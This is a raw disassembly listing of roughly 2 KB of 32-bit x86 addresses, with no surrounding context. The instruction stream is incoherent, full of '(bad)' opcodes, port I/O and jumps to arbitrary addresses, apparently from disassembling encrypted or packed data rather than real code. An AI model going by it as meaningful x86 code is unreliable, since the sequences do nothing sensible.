  40a0ab:	out    0x87,al
  40a0ad:	inc    edi
  40a0ae:	jne    0x40a0be
  40a0b0:	js     0x40a054
  40a0b2:	cld    
  40a0b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0b4:	dec    ebp
  40a0b5:	into   
  40a0b6:	es and ah,ch
  40a0b9:	dec    ebp
  40a0ba:	mov    esi,0x84ee3e19
  40a0bf:	dec    ebx
  40a0c0:	dec    eax
  40a0c1:	cmp    dl,ch
  40a0c3:	lock mov bh,0x46
  40a0c6:	inc    ecx
  40a0c7:	int    0x72
  40a0c9:	inc    edi
  40a0ca:	jae    0x40a109
  40a0cc:	outs   dx,BYTE PTR ds:[esi]
  40a0cd:	sbb    bl,bh
  40a0cf:	cmp    esp,DWORD PTR [edi-0x1c]
  40a0d2:	scas   al,BYTE PTR es:[edi]
  40a0d3:	mov    esi,0x4468035e
  40a0d8:	sbb    DWORD PTR [ecx],eax
  40a0da:	bound  edi,QWORD PTR [ecx]
  40a0dc:	je     0x40a08d
  40a0de:	sub    al,0xb7
  40a0e0:	or     ecx,esi
  40a0e2:	stos   BYTE PTR es:[edi],al
  40a0e3:	mov    al,0x96
  40a0e5:	xrelease mov BYTE PTR [edi],0x49
  40a0e9:	mov    bh,BYTE PTR [edx+0x23]
  40a0ec:	hlt    
  40a0ed:	sbb    DWORD PTR [esi-0x59],ebp
  40a0f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0f1:	mov    bl,0xd
  40a0f3:	and    BYTE PTR [ebx-0x405345b0],0x86
  40a0fa:	push   DWORD PTR [eax-0x29]
  40a0fd:	adc    ebx,eax
  40a0ff:	loop   0x40a12c
  40a101:	js     0x40a17e
  40a103:	cmc    
  40a104:	fimul  WORD PTR [edi+edi*4+0x3d]
  40a108:	sahf   
  40a109:	nop
  40a10a:	aad    0xdd
  40a10c:	sub    DWORD PTR [esi],0x3fe588d3
  40a112:	pop    es
  40a113:	cmp    BYTE PTR [edi+eiz*8+0x13],0xc7
  40a118:	or     edx,DWORD PTR [eax]
  40a11a:	and    al,0x71
  40a11d:	mov    eax,ds:0xf4db6b8d
  40a122:	bnd ret 
  40a124:	pop    eax
  40a125:	sub    dh,BYTE PTR [edx-0x1198b519]
  40a12b:	mov    esp,0x52406551
  40a130:	pop    ebp
  40a131:	jle    0x40a186
  40a133:	stos   DWORD PTR es:[edi],eax
  40a134:	jne    0x40a19a
  40a136:	out    0x27,al
  40a138:	add    esi,ebx
  40a13a:	add    DWORD PTR [ebx-0x3a1cbff2],0x5e
  40a141:	mov    esp,DWORD PTR [esi]
  40a143:	(bad)  
  40a144:	mov    al,ds:0xd24ec2ac
  40a149:	sub    al,0x58
  40a14b:	cs into 
  40a14d:	aas    
  40a14e:	sub    DWORD PTR [bp+di-0x215a],esp
  40a153:	mov    bl,0xe
  40a155:	pusha  
  40a156:	xchg   DWORD PTR [eax-0x60],ebx
  40a159:	out    dx,al
  40a15a:	enter  0x5112,0xd3
  40a15e:	and    ch,BYTE PTR [esi+0x1d9a1fc6]
  40a164:	adc    al,0x3f
  40a166:	daa    
  40a167:	or     dl,BYTE PTR [edi-0x6e]
  40a16a:	push   edi
  40a16b:	push   edx
  40a16c:	jmp    0xe6955c6c
  40a171:	das    
  40a172:	adc    al,0xd
  40a174:	push   edx
  40a175:	mov    dl,0xf0
  40a177:	call   0x5a977ebc
  40a17c:	cmp    ebx,0x46604dac
  40a182:	xor    eax,esp
  40a184:	mov    ebx,0xa57c33d6
  40a189:	fwait
  40a18a:	push   esp
  40a18b:	pop    ecx
  40a18c:	in     eax,dx
  40a18d:	cld    
  40a18e:	jne    0x40a152
  40a190:	push   ebx
  40a191:	cmc    
  40a192:	inc    edi
  40a193:	test   al,0xc3
  40a195:	mov    dl,0x79
  40a197:	pop    ebp
  40a198:	cdq    
  40a199:	mov    al,ds:0x8d604c3c
  40a19e:	push   edx
  40a19f:	out    dx,eax
  40a1a0:	in     eax,dx
  40a1a1:	add    BYTE PTR [eax+0x29],al
  40a1a4:	push   esp
  40a1a5:	push   es
  40a1a6:	addr16 inc edi
  40a1a8:	int    0xe7
  40a1aa:	sar    BYTE PTR [ecx+esi*8+0x41118779],1
  40a1b1:	test   DWORD PTR [eax-0x4d],ebp
  40a1b4:	pop    ecx
  40a1b5:	sub    al,0x26
  40a1b7:	out    0x7,eax
  40a1b9:	adc    dh,BYTE PTR [esi-0x42]
  40a1bc:	call   0xcc1a:0xea90ef42
  40a1c3:	fcom   DWORD PTR ds:[edx]
  40a1c6:	out    0xef,eax
  40a1c8:	pusha  
  40a1c9:	ss inc edx
  40a1cb:	outs   dx,BYTE PTR ds:[esi]
  40a1cc:	jp     0x40a174
  40a1ce:	sub    al,0x2b
  40a1d0:	outs   dx,WORD PTR ds:[esi]
  40a1d2:	or     cl,BYTE PTR [ebx+0x31a6485f]
  40a1d8:	pop    esi
  40a1d9:	mov    WORD PTR [edi-0x41240db8],es
  40a1df:	pop    edx
  40a1e0:	fdivr  st(3),st
  40a1e2:	dec    esp
  40a1e3:	test   edx,0xbc2444e7
  40a1e9:	fist   DWORD PTR [esi+eax*1]
  40a1ec:	mov    al,0x88
  40a1ee:	out    dx,al
  40a1ef:	out    0x62,al
  40a1f1:	dec    eax
  40a1f2:	ss inc eax
  40a1f4:	or     edi,esp
  40a1f6:	fstp   TBYTE PTR [ebx]
  40a1f8:	sti    
  40a1f9:	fst    DWORD PTR ds:0xdf7dfeb3
  40a1ff:	lea    ecx,[esp+esi*4-0xd]
  40a203:	call   0xade59831
  40a208:	scas   al,BYTE PTR es:[edi]
  40a209:	test   eax,0xd49b1700
  40a20e:	pop    edi
  40a20f:	adc    dl,BYTE PTR [edx]
  40a211:	inc    esp
  40a212:	nop
  40a213:	rcr    edi,1
  40a215:	push   cs
  40a216:	mov    ecx,DWORD PTR [ebx+0x61]
  40a219:	pop    esp
  40a21a:	sbb    eax,0xaeb82ccb
  40a21f:	push   es
  40a220:	cmp    edx,esi
  40a222:	mov    ebx,DWORD PTR [esi+0x28]
  40a225:	mov    WORD PTR [edi+0x69],fs
  40a228:	mov    edx,0xbb7b5b88
  40a22d:	push   es
  40a22e:	test   BYTE PTR [edx+0x64],ch
  40a231:	scas   al,BYTE PTR es:[edi]
  40a232:	sete   BYTE PTR [esi-0x73]
  40a236:	mov    ebx,0x9f803473
  40a23b:	ftst   
  40a23d:	adc    DWORD PTR [eax],ebp
  40a23f:	test   eax,0xee03e194
  40a244:	mov    cl,0x53
  40a246:	sbb    BYTE PTR [edi-0x2b],bl
  40a249:	lea    edi,[eax+0x4a]
  40a24c:	push   ss
  40a24d:	jne    0x76936f4d
  40a253:	mov    ch,0xff
  40a255:	(bad)  
  40a256:	test   eax,0x972cb384
  40a25b:	and    eax,DWORD PTR ds:0xccff561f
  40a261:	aam    0x84
  40a263:	addr16 push 0xd5123109
  40a269:	sub    BYTE PTR [edx+0x27],al
  40a26c:	arpl   WORD PTR [esi+eiz*1],ax
  40a26f:	fcomp  QWORD PTR [eax-0x5bd1d135]
  40a275:	(bad)  
  40a276:	fdivr  QWORD PTR [ebx+0x75]
  40a279:	sub    BYTE PTR [edx],cl
  40a27b:	ja     0x40a226
  40a27d:	push   0x5b
  40a27f:	xchg   esi,eax
  40a280:	pop    ds
  40a281:	push   edx
  40a282:	das    
  40a283:	sub    ecx,DWORD PTR [ecx-0x3c3caf2e]
  40a289:	jns    0x40a308
  40a28b:	and    eax,0x8dbfdfa7
  40a290:	loopne 0x40a2be
  40a292:	(bad)  
  40a293:	xchg   edi,eax
  40a294:	dec    ebx
  40a295:	dec    ebp
  40a296:	imul   esp,DWORD PTR [eax+ebp*1],0xfffffff4
  40a29a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a29b:	and    al,0xa1
  40a29d:	inc    esp
  40a29e:	je     0x40a30e
  40a2a0:	popf   
  40a2a1:	cmp    edx,DWORD PTR [edi]
  40a2a3:	push   esp
  40a2a4:	mov    ah,BYTE PTR [ebp+ebp*4-0x501b12a8]
  40a2ab:	ror    DWORD PTR [ebx+0x130c0b14],cl
  40a2b1:	push   esi
  40a2b2:	pop    ecx
  40a2b3:	hlt    
  40a2b4:	pop    esi
  40a2b5:	lahf   
  40a2b6:	sub    BYTE PTR [ecx+ecx*1-0x13],cl
  40a2ba:	pop    edx
  40a2bb:	and    DWORD PTR [eax-0x3f],edx
  40a2be:	sub    eax,0x5ecba7c8
  40a2c3:	mov    ds:0x21cab135,eax
  40a2c8:	cmp    bh,BYTE PTR [ecx+edi*8]
  40a2cb:	pop    ds
  40a2cc:	int    0xfc
  40a2ce:	mov    al,BYTE PTR [edi+0x382ed5c1]
  40a2d4:	int3   
  40a2d5:	outs   dx,DWORD PTR ds:[esi]
  40a2d6:	mov    ecx,0x71541869
  40a2db:	fdivp  st(1),st
  40a2dd:	aam    0x31
  40a2df:	fidivr WORD PTR [ecx]
  40a2e1:	lahf   
  40a2e2:	or     eax,eax
  40a2e4:	scas   al,BYTE PTR es:[edi]
  40a2e5:	push   esp
  40a2e6:	cmp    al,0x5d
  40a2e8:	das    
  40a2e9:	outs   dx,BYTE PTR ds:[esi]
  40a2ea:	repz mov dh,0x7f
  40a2ed:	jns    0x40a36c
  40a2ef:	pop    esp
  40a2f0:	loop   0x40a2eb
  40a2f2:	xchg   BYTE PTR ds:0xcbb04d68,bl
  40a2f8:	xor    BYTE PTR [eax+ebx*4],ah
  40a2fb:	push   eax
  40a2fc:	ror    esp,0x67
  40a2ff:	cs stos DWORD PTR es:[edi],eax
  40a301:	cdq    
  40a302:	pop    edi
  40a303:	add    esp,edx
  40a305:	mov    edx,eax
  40a307:	fisub  WORD PTR [eax-0x10]
  40a30a:	jmp    esi
  40a30c:	dec    esp
  40a30d:	lds    ebp,FWORD PTR [ebx]
  40a30f:	inc    edx
  40a310:	fst    DWORD PTR [ecx]
  40a312:	cdq    
  40a313:	loopne 0x40a2b0
  40a315:	xor    BYTE PTR [esi+edx*1],ah
  40a318:	push   edx
  40a319:	rcr    DWORD PTR [edi],0x2c
  40a31c:	out    0x3b,al
  40a31e:	mov    edi,0xb73da790
  40a323:	xlat   BYTE PTR ds:[ebx]
  40a324:	(bad)  
  40a325:	sti    
  40a326:	jl     0x40a353
  40a328:	fcmovnb st,st(2)
  40a32a:	(bad)  
  40a32c:	popf   
  40a32d:	add    ch,BYTE PTR [ebx+0x78bbd24e]
  40a333:	sbb    esp,DWORD PTR [esi+0x344718f7]
  40a339:	pop    esi
  40a33a:	jl     0x40a315
  40a33c:	adc    al,0xfe
  40a33e:	ret    
  40a33f:	fisubr DWORD PTR [ebp+0x20]
  40a342:	inc    esp
  40a343:	xchg   esp,eax
  40a344:	adc    esp,DWORD PTR [esi]
  40a346:	out    dx,al
  40a347:	add    al,0x93
  40a349:	int3   
  40a34a:	xor    BYTE PTR [eax+esi*1+0xe828090],ch
  40a351:	jle    0x40a382
  40a353:	rcl    BYTE PTR [edi-0x2c],cl
  40a356:	aam    0x5c
  40a358:	mov    eax,0xc3f3d961
  40a35d:	std    
  40a35e:	sbb    ebp,DWORD PTR [esi+0x4c50d260]
  40a364:	xor    dl,bl
  40a366:	mov    cl,0xb2
  40a368:	inc    eax
  40a369:	enter  0x6b3a,0x81
  40a36d:	pop    es
  40a36e:	test   al,0xa3
  40a370:	les    edi,FWORD PTR ds:0x792dfb22
  40a376:	mov    ebx,0x12306af9
  40a37b:	out    dx,eax
  40a37c:	adc    al,0x9c
  40a37e:	sbb    eax,0x19b52c92
  40a383:	jmp    0x40a3fc
  40a385:	mov    edi,0x3d1cb30e
  40a38a:	in     al,0xea
  40a38c:	daa    
  40a38d:	lods   eax,DWORD PTR ds:[esi]
  40a38e:	pop    edx
  40a38f:	test   al,0x35
  40a391:	(bad)  
  40a392:	and    al,0xc4
  40a394:	imul   esi,DWORD PTR [eax]
  40a397:	xchg   esp,eax
  40a398:	mov    ch,0x16
  40a39a:	shl    DWORD PTR [edx-0x352fe17e],cl
  40a3a0:	aaa    
  40a3a1:	out    0x1a,al
  40a3a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3a4:	or     BYTE PTR [edx+esi*1],0x90
  40a3a8:	xchg   ebp,eax
  40a3a9:	adc    al,0xe6
  40a3ab:	sbb    cl,ah
  40a3ad:	lock imul esp,DWORD PTR [edi+0x7756196c],0xfe13807
  40a3b8:	mov    ds,WORD PTR [ecx]
  40a3ba:	or     DWORD PTR [edi-0x467cbb68],edx
  40a3c0:	mov    eax,0xf06c92b3
  40a3c5:	and    eax,0x8dd4ae10
  40a3ca:	sub    BYTE PTR ds:0x95bc040b,bl
  40a3d0:	cmp    bl,BYTE PTR [ecx+0x3a60de1f]
  40a3d6:	ds (bad) 
  40a3d8:	jmp    0x94ce:0x9ba60b20
  40a3df:	push   ebp
  40a3e0:	dec    ebx
  40a3e1:	or     esi,ecx
  40a3e3:	les    edx,FWORD PTR [ebp+0x70]
  40a3e6:	sub    eax,0x761bcac0
  40a3eb:	inc    edi
  40a3ec:	dec    ebp
  40a3ed:	stos   DWORD PTR es:[edi],eax
  40a3ee:	inc    esi
  40a3ef:	adc    DWORD PTR [esp+ebx*1],eax
  40a3f2:	pop    ds
  40a3f3:	inc    esp
  40a3f4:	pushf  
  40a3f5:	cmc    
  40a3f6:	sub    DWORD PTR [ecx],eax
  40a3f8:	cmp    eax,0xac4b5979
  40a3fd:	cmp    BYTE PTR [ebp+0x29],al
  40a400:	(bad)  
  40a401:	adc    DWORD PTR [eax],ebx
  40a403:	inc    esi
  40a404:	retf   0xcdb7
  40a407:	iret   
  40a408:	fmul   QWORD PTR [edx+0xa]
  40a40b:	jmp    0xaddc9c37
  40a410:	dec    edx
  40a411:	mov    cl,0x15
  40a413:	push   0x6673e1b3
  40a418:	add    ecx,0x33
  40a41b:	(bad)  
  40a41c:	mov    ds:0xfb9a47f,al
  40a421:	sti    
  40a422:	sbb    ah,BYTE PTR [edx-0x4d]
  40a425:	lock iret 
  40a427:	mov    BYTE PTR ss:0x7655d28,0x99
  40a42f:	test   eax,0x760724a1
  40a434:	ins    DWORD PTR es:[edi],dx
  40a435:	jecxz  0x40a44e
  40a437:	or     al,0x8c
  40a439:	sbb    ah,BYTE PTR [eax]
  40a43b:	mov    ebx,0xc21d06c0
  40a440:	cs mov ebx,0xa9f2ed6a
  40a446:	adc    BYTE PTR [esi+0x25],al
  40a449:	dec    eax
  40a44a:	jnp    0x40a497
  40a44c:	push   esp
  40a44d:	les    esp,FWORD PTR [edi-0x26c36463]
  40a453:	retf   
  40a454:	les    esi,FWORD PTR [edx]
  40a456:	mov    ecx,0xc00fbbc8
  40a45b:	push   0x7
  40a45d:	xor    eax,DWORD PTR [edx-0x53]
  40a460:	in     eax,0xc6
  40a462:	sub    DWORD PTR [esi-0x15162a5a],0xfffffff8
  40a469:	pushaw 
  40a46b:	fimul  WORD PTR [esi+ebx*8]
  40a46e:	lea    eax,[edi+ebp*8]
  40a471:	mov    edx,0x5fcc7725
  40a476:	pop    ecx
  40a477:	and    eax,0x4683079c
  40a47c:	xlat   BYTE PTR ds:[ebx]
  40a47d:	rcr    BYTE PTR [eax-0x566533ca],0xd5
  40a484:	jp     0x40a4af
  40a486:	dec    esi
  40a487:	ins    DWORD PTR es:[edi],dx
  40a488:	arpl   WORD PTR [edx-0x5c8c7b1b],cx
  40a48e:	pop    ebp
  40a48f:	dec    eax
  40a490:	sbb    al,0x63
  40a492:	repz ja 0x40a478
  40a495:	fwait
  40a496:	hlt    
  40a497:	mov    cl,0x9a
  40a499:	push   es
  40a49a:	inc    esi
  40a49b:	test   al,0x76
  40a49d:	or     al,0x8a
  40a49f:	pop    edx
  40a4a0:	dec    esp
  40a4a1:	(bad)  
  40a4a2:	push   edi
  40a4a3:	sub    al,0xad
  40a4a5:	adc    dl,al
  40a4a7:	aad    0x62
  40a4a9:	add    DWORD PTR [edx+0xd],0xc8f82ded
  40a4b0:	ins    BYTE PTR es:[edi],dx
  40a4b1:	lds    edx,FWORD PTR [ebp+0x1c616423]
  40a4b7:	mov    BYTE PTR [eax-0x30],ch
  40a4ba:	daa    
  40a4bb:	push   ss
  40a4bc:	daa    
  40a4bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4be:	les    ebp,FWORD PTR [ebx+0x26740a43]
  40a4c4:	ins    BYTE PTR es:[edi],dx
  40a4c5:	(bad)  
  40a4c6:	mov    dl,0xc8
  40a4c8:	jle    0x40a454
  40a4ca:	lds    esi,FWORD PTR [edi]
  40a4cc:	mov    bl,0xe7
  40a4ce:	rol    DWORD PTR [ebx-0x22],0xbb
  40a4d2:	call   0xc80e:0x25472b1d
  40a4d9:	mov    esp,0x10664b49
  40a4de:	dec    cl
  40a4e0:	xchg   ebp,eax
  40a4e1:	adc    dl,BYTE PTR [ebp+0x12]
  40a4e4:	cdq    
  40a4e5:	ins    DWORD PTR es:[edi],dx
  40a4e6:	mov    ds:0x9c71069a,ax
  40a4ec:	jg     0x40a540
  40a4ee:	mov    esi,0x3e432aae
  40a4f3:	xchg   BYTE PTR [eax-0x74],al
  40a4f6:	stos   DWORD PTR es:[edi],eax
  40a4f7:	xlat   BYTE PTR ds:[ebx]
  40a4f8:	mov    BYTE PTR [ecx],bl
  40a4fa:	rol    DWORD PTR [eax+0xf587e4e],cl
  40a500:	ins    BYTE PTR es:[edi],dx
  40a501:	(bad)
  40a504:	push   0xeecd2b5f
  40a509:	(bad)  
  40a50a:	xchg   esi,eax
  40a50b:	jecxz  0x40a4da
  40a50d:	hlt    
  40a50e:	lods   eax,DWORD PTR ds:[esi]
  40a50f:	sub    al,0x9d
  40a511:	dec    ebp
  40a512:	add    edx,ebx
  40a514:	retf   
  40a515:	xchg   esp,eax
  40a516:	xor    BYTE PTR [ebx-0x2d98e536],dl
  40a51c:	inc    ebp
  40a51d:	ins    BYTE PTR es:[edi],dx
  40a51e:	call   0xa1b765c0
  40a523:	(bad)  
  40a524:	call   0x1a66da3
  40a529:	(bad)  
  40a52b:	and    edi,ebp
  40a52d:	test   eax,0xc5647795
  40a532:	push   0x63f9c46a
  40a537:	sub    DWORD PTR [esi],edx
  40a539:	xchg   esi,eax
  40a53a:	mov    eax,ds:0xe812996d
  40a53f:	adc    BYTE PTR [edi+0x732ab6d3],0x8f
  40a546:	sub    esp,ebp
  40a548:	test   al,0x85
  40a54a:	ja     0x40a4d7
  40a54c:	ficom  DWORD PTR [edi]
  40a54e:	mov    WORD PTR [esi+0x7],?
  40a551:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a552:	mov    al,0x8b
  40a554:	enter  0x3f8c,0x11
  40a558:	mov    ds:0xf8f69b81,eax
  40a55d:	cs push edx
  40a55f:	rcr    ecx,0x70
  40a562:	dec    edi
  40a563:	es and al,cl
  40a566:	sub    bh,BYTE PTR [ecx]
  40a568:	ss (bad) 
  40a56a:	ror    ebx,cl
  40a56c:	pop    ecx
  40a56d:	inc    esp
  40a56e:	and    DWORD PTR [edi+0x3d],esp
  40a571:	mov    bl,0xf8
  40a573:	in     eax,dx
  40a574:	add    al,0x51
  40a576:	imul   ebp,DWORD PTR [eax],0x2c
  40a579:	pop    ebx
  40a57a:	and    BYTE PTR [esi-0x5d94c215],bl
  40a580:	fcmovnb st,st(0)
  40a582:	aaa    
  40a583:	jno    0x40a57b
  40a585:	mov    esi,0x7f19332d
  40a58a:	adc    ecx,eax
  40a58c:	lods   eax,DWORD PTR ds:[esi]
  40a58d:	or     DWORD PTR [eax],0xffffffe8
  40a590:	xchg   DWORD PTR [edx],edx
  40a592:	fsubr  DWORD PTR ds:0xf2bd8810
  40a598:	rcl    DWORD PTR [edx+0x59],cl
  40a59b:	pop    ds
  40a59c:	cmp    BYTE PTR [ecx+eiz*8],ah
  40a59f:	test   BYTE PTR [edx],cl
  40a5a1:	sahf   
  40a5a2:	push   cs
  40a5a3:	pop    eax
  40a5a4:	mov    ecx,ecx
  40a5a6:	lds    edx,FWORD PTR ds:0xf48d3389
  40a5ac:	mov    ebp,DWORD PTR [edx-0x25c189e9]
  40a5b2:	shl    DWORD PTR [ebx+0x3c],1
  40a5b5:	pop    es
  40a5b6:	pop    ss
  40a5b7:	and    eax,0x36cff4dd
  40a5bc:	in     eax,dx
  40a5bd:	jp     0x40a614
  40a5bf:	cmp    DWORD PTR [edi+0x4e87a9a8],ebx
  40a5c5:	xchg   edi,eax
  40a5c6:	mov    eax,ds:0x9eff42ca
  40a5cb:	out    0xf7,al
  40a5cd:	daa    
  40a5ce:	adc    al,ch
  40a5d0:	hlt    
  40a5d1:	sbb    DWORD PTR [edx+0x69b39e07],ecx
  40a5d7:	mov    ds,WORD PTR [eax+0x46]
  40a5da:	pop    ecx
  40a5db:	enter  0xdcde,0x9e
  40a5df:	push   eax
  40a5e0:	push   ds
  40a5e1:	cwde   
  40a5e2:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5e4:	cmp    al,0x13
  40a5e6:	mov    bh,0x22
  40a5e8:	mov    dh,0xe5
  40a5ea:	mov    eax,ds:0xa7d55157
  40a5ef:	das    
  40a5f0:	sbb    BYTE PTR [ebx-0x3f],bl
  40a5f3:	mov    edx,0x923c1247
  40a5f8:	pop    esp
  40a5f9:	inc    eax
  40a5fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5fb:	sub    ebp,0xffffffe3
  40a5fe:	pop    edx
  40a5ff:	pop    eax
  40a600:	dec    ecx
  40a601:	call   0x390:0xe2d9fd3c
  40a608:	push   0xe486b36c
  40a60d:	xor    DWORD PTR [esp+eiz*2+0x76b53200],edx
  40a614:	jecxz  0x40a68d
  40a616:	fwait
  40a617:	jg     0x40a65d
  40a619:	mov    dh,0x1f
  40a61b:	repz add DWORD PTR [ecx+0x573d5086],esi
  40a622:	pop    ss
  40a623:	bnd ret 
  40a625:	xchg   DWORD PTR [edi+0x10d16b7b],eax
  40a62b:	outs   dx,DWORD PTR ds:[esi]
  40a62c:	pusha  
  40a62d:	add    eax,0x82cc2cf3
  40a632:	mov    ds:0xe1ec88db,eax
  40a637:	and    ah,bl
  40a639:	es push ebp
  40a63b:	xchg   edi,eax
  40a63c:	in     eax,dx
  40a63d:	adc    esi,eax
  40a63f:	pop    esi
  40a640:	mov    ch,0x3a
  40a642:	xchg   BYTE PTR [ebp-0x68],bl
  40a645:	cmp    BYTE PTR [esi],dh
  40a647:	(bad)  
  40a648:	je     0x40a683
  40a64a:	mov    eax,0x2e6e636c
  40a64f:	ins    DWORD PTR es:[edi],dx
  40a650:	sbb    ch,al
  40a652:	inc    ebp
  40a653:	mov    dh,BYTE PTR [ecx-0x45]
  40a656:	cwde   
  40a657:	mov    ch,0x5e
  40a659:	cli    
  40a65a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a65b:	clc    
  40a65c:	rcr    edi,cl
  40a65e:	or     eax,0x2ed7b790
  40a663:	jge    0x40a6de
  40a665:	(bad)  
  40a667:	xor    DWORD PTR [esi+0x2a],esp
  40a66a:	retf   0x302a
  40a66d:	dec    ecx
  40a66e:	adc    BYTE PTR [ebx+0x382be3d2],dl
  40a674:	adc    al,0x56
  40a676:	sub    edx,DWORD PTR [esi+0x2c2860a8]
  40a67c:	mov    ds:0xb9c46bf7,al
  40a681:	inc    ebp
  40a682:	xchg   esi,eax
  40a683:	sbb    edi,esi
  40a685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a686:	aas    
  40a687:	jbe    0x40a685
  40a689:	ret    
  40a68a:	and    BYTE PTR [ebx-0x46bd7832],ch
  40a690:	add    edi,edx
  40a692:	(bad)  
  40a693:	sbb    cl,BYTE PTR [edi+0x62]
  40a696:	dec    esp
  40a697:	mov    ebp,0x4c5de88d
  40a69c:	test   al,0x9a
  40a69e:	loope  0x40a6b0
  40a6a0:	sub    al,0x1
  40a6a2:	mov    ecx,0x4b5285c7
  40a6a7:	les    eax,FWORD PTR [edi+0x1e]
  40a6aa:	xor    DWORD PTR [esi+0x8b2190f],ebx
  40a6b0:	pop    edi
  40a6b1:	and    DWORD PTR [ecx*8-0x7c18c279],ebp
  40a6b8:	in     al,dx
  40a6b9:	ror    BYTE PTR [edi-0x43],cl
  40a6bc:	jge    0x40a6ed
  40a6be:	mov    al,ds:0xf9dacefb
  40a6c3:	fwait
  40a6c4:	cmc    
  40a6c5:	ret    0x8fc0
  40a6c8:	lock xor bl,0xd6
  40a6cc:	cmc    
  40a6cd:	mov    ebx,ds
  40a6cf:	mov    ebp,0xb2be4c78
  40a6d4:	test   eax,0xc3adb67e
  40a6d9:	arpl   WORD PTR [edi-0x2f],dx
  40a6dc:	inc    esi
  40a6dd:	xchg   ecx,eax
  40a6de:	push   eax
  40a6df:	add    ebp,eax
  40a6e1:	sub    BYTE PTR [edi-0x6f],ah
  40a6e4:	retf   0x51dc
  40a6e7:	add    al,0xa0
  40a6e9:	aam    0xf8
  40a6eb:	pop    ebp
  40a6ec:	mov    dh,0x8a
  40a6ee:	in     eax,dx
  40a6ef:	inc    esp
  40a6f0:	lods   al,BYTE PTR ds:[esi]
  40a6f1:	xchg   edi,eax
  40a6f2:	(bad)  
  40a6f3:	mov    edx,0x86d3c1ac
  40a6f8:	imul   edx,esp,0xffffffcc
  40a6fb:	mov    cl,BYTE PTR [ecx+0x5f]
  40a6fe:	aas    
  40a6ff:	mov    WORD PTR [ecx+ebx*4-0x6c],?
  40a703:	stc    
  40a704:	imul   edx,DWORD PTR [ebx],0xe93ec11
  40a70a:	mov    esp,0xf9b0289c
  40a70f:	fidivr WORD PTR [edx+esi*1-0x55]
  40a713:	aaa    
  40a714:	sbb    al,0xa5
  40a716:	stos   DWORD PTR es:[edi],eax
  40a717:	aas    
  40a718:	fld    st(3)
  40a71a:	cwde   
  40a71b:	test   al,0x86
  40a71d:	(bad)  
  40a71e:	in     eax,0xdd
  40a720:	jne    0x40a779
  40a722:	gs sahf 
  40a724:	jnp    0x40a733
  40a726:	mov    ds:0xc7ea832b,eax
  40a72b:	inc    edi
  40a72c:	daa    
  40a72d:	lds    ebx,FWORD PTR [edx+eiz*2-0x486d6142]
  40a734:	shr    bh,cl
  40a736:	inc    ecx
  40a737:	sbb    al,0x37
  40a739:	mov    cl,0xe1
  40a73b:	ins    BYTE PTR es:[edi],dx
  40a73c:	xchg   ecx,eax
  40a73d:	aas    
  40a73e:	adc    ebx,ebx
  40a740:	sbb    edi,DWORD PTR [esi-0x7]
  40a743:	and    eax,0x888dae3f
  40a748:	div    dh
  40a74a:	fnstcw WORD PTR [edx]
  40a74c:	add    DWORD PTR [ecx-0x7c],eax
  40a74f:	test   DWORD PTR [esi-0x18953d9c],edi
  40a755:	fwait
  40a756:	xlat   BYTE PTR ds:[ebx]
  40a757:	ror    ebp,cl
  40a759:	dec    ebp
  40a75a:	dec    ecx
  40a75b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a75c:	cmp    eax,0x4ed775e2
  40a761:	mov    esp,0x81b431c0
  40a766:	cmp    eax,DWORD PTR [edi]
  40a768:	retf   
  40a769:	sbb    dl,BYTE PTR [ebx]
  40a76b:	out    0x35,eax
  40a76d:	push   ebp
  40a76e:	aaa    
  40a76f:	in     eax,dx
  40a770:	test   BYTE PTR [ebx],cl
  40a772:	pop    edx
  40a773:	pushf  
  40a774:	jge    0x40a77f
  40a776:	push   ebx
  40a777:	or     al,0x4a
  40a779:	inc    esp
  40a77a:	pop    esp
  40a77b:	rol    DWORD PTR [eax+0x6a],cl
  40a77e:	pop    ebx
  40a77f:	in     al,dx
  40a780:	fstp   QWORD PTR [ebp-0x31a1aa5d]
  40a786:	cwde   
  40a787:	or     BYTE PTR [edi+0x6d487371],bl
  40a78d:	repnz or al,cl
  40a790:	jg     0x40a764
  40a792:	ins    BYTE PTR es:[edi],dx
  40a793:	fadd   DWORD PTR [eax-0x434e0ccc]
  40a799:	push   edi
  40a79a:	daa    
  40a79b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a79c:	xor    eax,0xaae9d605
  40a7a1:	fld    QWORD PTR [edi+0x6c]
  40a7a4:	cmc    
  40a7a5:	clc    
  40a7a6:	inc    edx
  40a7a7:	mov    ds:0xfd8e8899,eax
  40a7ac:	or     ebx,DWORD PTR [ebx+0x3c89d07b]
  40a7b2:	shr    DWORD PTR [ebp+esi*4+0xabaceab],0x17
  40a7ba:	imul   edx,DWORD PTR [edx+0x5ba85cba],0x25af4e44
  40a7c4:	loope  0x40a810
  40a7c6:	jle    0x40a814
  40a7c8:	test   al,0x22
  40a7ca:	sbb    cl,ah
  40a7cc:	add    eax,0x55455fca
  40a7d1:	and    ebx,DWORD PTR [edx]
  40a7d3:	cs xchg ebp,eax
  40a7d5:	push   cs
  40a7d6:	js     0x40a7f4
  40a7d8:	push   eax
  40a7d9:	cmp    esp,DWORD PTR [ebx+0xb]
  40a7dc:	jl     0x40a820
  40a7de:	dec    ecx
  40a7df:	(bad)  [ebx+0x22]
  40a7e2:	or     al,0x2e
  40a7e4:	sub    DWORD PTR [esi-0x6688afed],esi
  40a7ea:	sub    esi,ebp
  40a7ec:	add    eax,0x70f5ac52
  40a7f1:	jmp    0x6606:0xc06f35e2
  40a7f8:	addr16 sahf 
  40a7fa:	inc    BYTE PTR [ebx+eax*2+0x685f2481]
  40a801:	(bad)  
  40a802:	repz mov edi,0x3b4cb333
  40a808:	lds    edi,FWORD PTR [ecx+0x77]
  40a80b:	pusha  
  40a80c:	iret   
  40a80d:	test   DWORD PTR [edx+0x5d],ebp
  40a810:	out    dx,al
  40a811:	dec    BYTE PTR [ecx+0x418b37a5]
  40a817:	(bad)  
  40a819:	fwait
